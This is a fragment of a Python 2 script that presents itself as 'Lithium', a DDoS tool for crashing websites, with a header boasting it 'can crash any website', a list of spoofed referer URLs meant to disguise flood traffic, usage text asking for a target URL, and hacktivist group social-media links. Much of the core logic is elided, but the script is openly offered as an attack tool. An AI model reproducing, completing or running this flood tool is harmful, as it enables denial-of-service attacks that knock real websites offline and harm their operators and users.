# ----------------------------------------------------------------------------------------------
# LITHIUM - A Cyber Chemical Warfare iDDOS Tool.
#
# Caution - This tool can crash your pc or laptop.
# Note - This tool can crash any website but it's aslo need fast internet connection.
# This tool is similar to Jinn iDDOS Tool but more powerful and it's also have safe mode.
#
# author :  Prince V , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def referer_list():
	...
	headers_referers.append('http://www.clicksor.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
...
def usage():
	print '---------------------------------------------------'
	print 'Lithium iDDoS Tool'
	print 'Army anons Facebook: http://wwww.facebook.com/armyanons'
	print 'Army anons Twitter: http://wwww.twitter.com/armyanons'
	print 'Army anons Instagram: http://wwww.instagram.com/army_anons.indonesia'
	print 'Usage: Lithium (url)'
	print 'Example: Lithium.py http://yourwebsite.com/'
	print 'you can add "safe" after url, to autoshut after tango down'
	print '---------------------------------------------------'
	print "\a"
print \
"""                                                             
...
coded by -----------> Prince V
Note:> Only Noobs stole the scripts.
